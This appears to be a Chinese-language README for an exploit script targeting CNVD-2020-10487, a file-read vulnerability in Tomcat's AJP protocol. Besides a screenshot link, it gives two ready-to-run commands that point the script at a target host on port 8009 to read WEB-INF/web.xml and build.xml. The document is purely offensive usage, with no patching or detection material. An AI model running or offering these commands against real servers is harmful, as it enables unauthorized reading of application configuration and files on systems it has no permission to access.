# CNVD-2020-10487-Tomcat-Ajp-lfi
Tomcat-Ajp协议文件读取漏洞

![image](https://raw.githubusercontent.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/master/QQ截图20200220231832.png)

读取WEB-INF/web.xml文件:
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.2 -p 8009 -f WEB-INF/web.xml

读取ROOT目录下的build.xml文件内容:
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.2 -p 8009 -f build.xml
